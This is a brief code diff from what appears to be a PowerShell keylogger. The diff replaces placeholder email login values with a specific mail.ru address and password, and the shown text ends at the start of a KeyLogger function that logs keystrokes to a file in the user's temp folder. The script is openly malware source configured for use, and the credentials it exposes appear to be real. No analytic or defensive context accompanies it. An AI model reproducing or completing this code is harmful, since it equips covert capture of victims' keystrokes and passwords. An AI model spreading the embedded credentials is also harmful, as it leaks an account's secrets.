@@ -1,6 +1,6 @@
 # email credentials
-$email = "yourEmail@nasa.gov"
-$password = "passwd"
+$email = "mark222lool@mail.ru"
+$password = "123tree1oo1"
 
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
